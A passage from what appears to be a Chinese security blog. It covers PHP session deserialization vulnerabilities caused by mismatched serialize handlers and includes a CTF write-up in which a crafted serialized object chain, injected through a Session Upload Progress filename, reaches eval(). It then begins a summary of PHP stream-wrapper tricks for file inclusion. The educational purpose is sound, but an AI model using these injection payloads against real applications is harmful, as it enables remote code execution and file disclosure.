<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'spoock'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'|O:11:"PeopleClass":0:{}'</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>上述的$_SESSION的数据如果使用php_serialize，那么最后的存储的内容就是<code>a:1:{s:6:"spoock";s:24:"|O:11:"PeopleClass":0:{}";}</code> 。</p>
<p>但是我们在进行读取的时候，如果选择的是php，那么最后读取的内容是：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">array</span> <span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
 <span class="token string">'a:1:{s:6:"spoock";s:24:"'</span> <span class="token operator">=</span><span class="token operator">></span> 
 <span class="token function">object</span><span class="token punctuation">(</span>__PHP_Incomplete_Class<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
 <span class="token keyword">public</span> <span class="token string">'__PHP_Incomplete_Class_Name'</span> <span class="token operator">=</span><span class="token operator">></span> string <span class="token string">'PeopleClass'</span> <span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>这是因为当使用php引擎的时候，php引擎会以竖杠 | 作为作为key(键)和value(值)的分隔符，那么就会将a:1:{s:6:“spoock”;s:24:”作为SESSION的key(键)，将O:11:“PeopleClass”:0:{}作为value(值)，然后进行反序列化，最后就会得到PeopleClas这个类。</p>
<p><strong>这种由于序列化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。</strong></p>
<h4 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h4><p><strong>存在s1.php和us2.php这两个文件，2个文件所使用的SESSION的引擎不一样，就形成了一个漏洞。</strong></p>
<p>s1.php，使用php_serialize来处理session</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"spoock"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>us2.php，使用php来处理session</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>`localhost<span class="token operator">/</span>s1<span class="token punctuation">.</span>php<span class="token operator">?</span>a<span class="token operator">=</span><span class="token operator">|</span>O<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"lemon"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"hi"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"echo "</span>spoock<span class="token string">";"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>`
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">lemon</span> <span class="token punctuation">{</span>
 <span class="token keyword">var</span> <span class="token variable">$hi</span><span class="token punctuation">;</span>
 <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
 <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hi</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>

 <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hi</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">// O:5:"lemon":1:{s:2:"hi";s:14:"echo "spoock";";}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>此题在s1.php中有可以传入session的点，所以就不用构造表单了，这题的突破点在哪里，没错，就是我备注的那块s2.php中<code>ini_set('session.serialize_handler', 'php');</code>，选择session序列化处理器。</p>
<p>当访问s1.php时，提交如下的数据并存储到session文件中：</p>
<pre class="line-numbers language-php"><code class="language-php">localhost<span class="token operator">/</span>s1<span class="token punctuation">.</span>php<span class="token operator">?</span>a<span class="token operator">=</span><span class="token operator">|</span>O<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"lemon"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"hi"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"echo "</span>spoock<span class="token string">";"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>此时传入的数据会按照php_serialize来进行序列化，由s2.php读取时按照php来反序列化。</p>
<p>O:5:“lemon”:1:{s:2:“hi”;s:14:“echo “spoock”;”;}由以下序列化来得到，在加上一个竖杠 |<br>就行了</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name">lemon</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$hi</span><span class="token operator">=</span><span class="token string">'xxxxx'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">lemon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
xxxxx处按照你想执行的代码来填写，这里填的是<span class="token keyword">echo</span> "spoock
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>此时访问us2.php时，页面输出，spoock成功执行了我们构造的函数。因为在访问us2.php时，程序会按照php来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的eval()方法。</strong></p>
<h4 id="CTF例题"><a href="#CTF例题" class="headerlink" title="CTF例题"></a>CTF例题</h4><p>在安恒杯中的一道题目就考察了这个知识点。题目中的关键代码如下：<br><strong>class.php</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
<span class="token comment" spellcheck="true">//show_source(__FILE__);</span>

<span class="token keyword">class</span> <span class="token class-name">foo1</span><span class="token punctuation">{</span>
 <span class="token keyword">public</span> <span class="token variable">$varr</span><span class="token punctuation">;</span>
 <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token keyword">echo</span> <span class="token string">"&lt;br>文件"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span><span class="token punctuation">.</span><span class="token string">"存在&lt;br>"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">echo</span> <span class="token string">"&lt;br>这是foo1的析构函数&lt;br>"</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">foo2</span><span class="token punctuation">{</span>
 <span class="token keyword">public</span> <span class="token variable">$varr</span><span class="token punctuation">;</span>
 <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
 <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span> <span class="token operator">=</span> <span class="token string">'1234567890'</span><span class="token punctuation">;</span>
  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">// 类被当作字符串时被调用</span>
  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 <span class="token keyword">function</span> <span class="token function">__desctuct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">echo</span> <span class="token string">"&lt;br>这是foo2的析构函数&lt;br>"</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">foo3</span><span class="token punctuation">{</span>
 <span class="token keyword">public</span> <span class="token variable">$varr</span><span class="token punctuation">;</span>
 <span class="token keyword">function</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 <span class="token keyword">function</span> <span class="token function">__desctuct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">echo</span> <span class="token string">"&lt;br>这是foo3的析构函数&lt;br>"</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>index.php</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">"./class.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span> <span class="token operator">=</span> <span class="token string">"phpinfo.php"</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span class="token number">1234567</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过代码发现，我们最终是要通过foo3中的execute()来执行我们自定义的函数。<br>那么我们首先在本地搭建环境，构造我们需要执行的自定义的函数。如下：<br><strong>myindex.php</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">foo3</span><span class="token punctuation">{</span>
 <span class="token keyword">public</span> <span class="token variable">$varr</span><span class="token operator">=</span><span class="token string">'echo "spoock";'</span><span class="token punctuation">;</span>
 <span class="token keyword">function</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">foo2</span><span class="token punctuation">{</span>
 <span class="token keyword">public</span> <span class="token variable">$varr</span><span class="token punctuation">;</span>
 <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
 <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span> <span class="token operator">=</span> <span class="token string">'1234567890'</span><span class="token punctuation">;</span>
  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 此时obj是foo3的一个实例对象</span>
  <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">foo1</span><span class="token punctuation">{</span>
 <span class="token keyword">public</span> <span class="token variable">$varr</span><span class="token punctuation">;</span>
 <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 此时varr是foo2的一个实例对象</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">// 这样通过在这两个类中分别实例化下一个类中的对象，将三个类衔接起来了</span>
<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在foo1中的构造函数中定义<code>$varr</code>的值为foo2的实例，在foo2中定义<code>$obj</code>为foo3的实例，在foo3中定义<code>$varr</code>的值为echo “spoock”。最终得到的序列化的值是</p>
<pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"foo1"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"varr"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"foo2"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"varr"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"1234567890"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"obj"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"foo3"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"varr"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"echo "</span>spoock<span class="token string">";"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>这样当上面的序列话的值写入到服务器端，然后再访问服务器的index.php，最终就会执行我们预先定义的echo “spoock”;的方法了。因为题中session_start();表示创建或重用已有的session，我们把存在漏洞的session写入到服务器端，然后再访问服务器的index.php，index.php会重用服务器中那个已有的存在漏洞的session。</strong></p>
<p><strong>此题没有可以反序列化的点，没有可以传入session的点，那么我们怎么改变或传入session呢。写入的方式主要是利用PHP中Session Upload Progress来进行设置，具体为，在上传文件时，如果同时POST一个与与INI中PHP_SESSION_UPLOAD_PROGRESS同名的变量，当PHP检测到这种POST请求时，它会在<code>$_SESSION</code>中添加一组数据，即就可以将filename的值赋值到session中，所以可以通过Session Upload Progress来设置session。由phpinfo()页面知，session.upload_progress.enabled为On，那么上传的页面的写法如下：</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://xxxxxx:port/index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>PHP_SESSION_UPLOAD_PROGRESS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>123<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>利用前面的html页面随便上传一个东西，抓包，在包中把filename改为如下：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token operator">|</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span>\"foo1\"<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span>\"varr\"<span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span>\"foo2\"<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span>\"varr\"<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span>\"<span class="token number">1</span>\"<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span>\"obj\"<span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span>\"foo3\"<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span>\"varr\"<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">:</span>\"<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>为防止转义，在引号前加上反斜杠\。最后就会将文件名写入到session中，具体的实现细节可以参考PHP手册。<br>注意与本地反序列化不一样的地方是要在最前方加上| ，因为这是php引擎的格式。</p>
<p>参考：<a href="https://www.jb51.net/article/107101.htm">https://www.jb51.net/article/107101.htm</a></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>php反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP伪协议总结</title>
    <url>/phpweixieyizongjie.html</url>
    <content><![CDATA[<h1 id="PHP伪协议总结"><a href="#PHP伪协议总结" class="headerlink" title="PHP伪协议总结"></a>PHP伪协议总结</h1><p><a href="https://segmentfault.com/a/1190000018991087">转文章，侵删</a>记录总结了PHP伪协议全面的利用姿势</p>
<blockquote>
<p>参考了这篇文章：<a href="https://www.freebuf.com/column/148886.html">php伪协议实现命令执行的七种姿势</a>，并根据自己理解进行了总结，也算是加深一下印象，方便以后使用。</p>
</blockquote>
<h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a><code>file://</code> 协议</h2><ul>
<li><p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:off/on</li>
<li><code>allow_url_include</code> :off/on</li>
</ul>
</li>
<li><p><strong>作用</strong>：<br>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p>
</li>
<li><p><strong>说明</strong>：<br><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path</code>会可选地搜索，也作为相对的路径。</p>
</li>
<li><p><strong>用法</strong>：</p>
<pre><code>/path/to/file.ext
relative/path/to/file.ext
fileInCwd.ext
C:/path/to/winfile.ext
C:\path\to\winfile.ext
\\smbserver\share\path\to\winfile.ext
file:///path/to/file.ext</code></pre></li>
<li><p><strong>示例</strong>：</p>
<ol>
<li><p><code>file://[文件的绝对路径和文件名]</code></p>
<pre><code>http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172418.png" alt="图片描述"></p>
</li>
<li><p><code>[文件的相对路径和文件名]</code></p>
<pre><code>http://127.0.0.1/include.php?file=./phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172419.png" alt="图片描述"></p>
</li>
<li><p><code>[http：//网络路径和文件名]</code></p>
<pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172420.png" alt="图片描述"></p>
</li>
</ol>
</li>
<li><p><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.file.php">http://php.net/manual/zh/wrappers.file.php</a></p>
</li>
</ul>
<h2 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a><code>php://</code> 协议</h2><ul>
<li><p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:off/on</li>
<li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp</code>需要on</li>
</ul>
</li>
<li><p><strong>作用</strong>：<br><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>
</li>
<li><p><strong>说明</strong>：<br>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
<table>
<thead>
<tr>
<th>协议</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>php://input</td>
<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype="multipart/form-data"</code> 的时候<code>php://input</code>是无效的。</td>
</tr>
<tr>
<td>php://output</td>
<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
</tr>
<tr>
<td>php://fd</td>
<td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>
</tr>
<tr>
<td>php://memory php://temp</td>
<td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>
</tr>
<tr>
<td>php://filter</td>
<td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>
</tr>
</tbody></table>
</li>
<li><p><strong><code>php://filter</code>参数详解</strong></p>
<p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p>
<table>
<thead>
<tr>
<th>php://filter 参数</th>
<th>描述</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>resource=&lt;要过滤的数据流&gt;</td>
<td>必须项。它指定了你要筛选过滤的数据流。</td>
<td></td>
</tr>
<tr>
<td>read=&lt;读链的过滤器&gt;</td>
<td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td>
